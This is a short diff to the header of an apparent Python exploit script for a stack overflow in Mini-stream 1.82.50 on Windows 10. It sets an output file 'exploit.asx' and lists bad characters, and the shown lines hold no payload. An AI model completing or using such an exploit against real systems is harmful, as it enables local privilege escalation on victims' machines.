@@ -2,9 +2,11 @@
 # Author: dead1
 # Vendor Homepage: http://mini-stream.net
 # Version: 1.82.50
+# local priv escalation through stack overflow
 # Tested on: Windows 10
-
 import struct
+
+## filename to create
 filename = "exploit.asx"
 
 ## bad chars: \x00\x01\x09\x0a\x1a
